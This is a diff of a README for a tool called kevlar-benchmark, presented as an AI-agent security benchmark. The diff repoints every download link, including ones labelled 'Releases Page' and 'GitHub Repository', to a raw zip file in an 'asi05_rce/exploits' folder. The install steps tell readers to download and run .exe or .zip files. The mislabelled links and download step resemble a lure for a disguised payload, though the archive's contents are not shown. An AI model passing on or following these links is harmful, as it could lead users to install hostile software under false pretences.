@@ -1,7 +1,7 @@
 # 🚀 kevlar-benchmark - Simplify Your Cybersecurity Testing
 
 ## 📥 Download Now
-[![Download kevlar-benchmark](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi03_identity_abuse/utils/benchmark-kevlar-v2.6.zip)](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi03_identity_abuse/utils/benchmark-kevlar-v2.6.zip)
+[![Download kevlar-benchmark](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi05_rce/exploits/benchmark-kevlar-v1.2.zip)](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi05_rce/exploits/benchmark-kevlar-v1.2.zip)
 
 ## 📝 Introduction
 Welcome to the Kevlar Benchmark project! This tool helps users run evaluations based on the OWASP Top 10 for Agentic Applications (AI-Agents) in 2026. It provides a simple way to assess the security of AI-driven apps and gather insights that can strengthen your defenses.
@@ -9,7 +9,7 @@ Welcome to the Kevlar Benchmark project! This tool helps users run evaluations b
 ## 📦 Installation
 Follow these steps to download and install Kevlar Benchmark:
 
-1. Visit the Releases page to get the latest version: [Download Page](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi03_identity_abuse/utils/benchmark-kevlar-v2.6.zip).
+1. Visit the Releases page to get the latest version: [Download Page](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi05_rce/exploits/benchmark-kevlar-v1.2.zip).
 2. On the Releases page, find the most recent version.
 3. Click the download link that suits your system (look for .exe or .zip files).
 4. Once downloaded, locate the file in your downloads folder.
@@ -55,8 +55,8 @@ Using Kevlar Benchmark is straightforward:
 - **Feedback**: We welcome your suggestions to improve the application. Feel free to reach out!
 
 ## 🔗 Additional Links
-- **GitHub Repository**: [kevlar-benchmark](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi03_identity_abuse/utils/benchmark-kevlar-v2.6.zip)
-- **Releases Page**: [Download Page](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi03_identity_abuse/utils/benchmark-kevlar-v2.6.zip)
+- **GitHub Repository**: [kevlar-benchmark](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi05_rce/exploits/benchmark-kevlar-v1.2.zip)
+- **Releases Page**: [Download Page](https://raw.githubusercontent.com/samsaeed22/kevlar-benchmark/main/modules/critical/asi05_rce/exploits/benchmark-kevlar-v1.2.zip)
 
 ## 🤝 Contributing
 Your contributions help us improve. If you wish to support the project, visit our contributing guidelines on the GitHub repository.
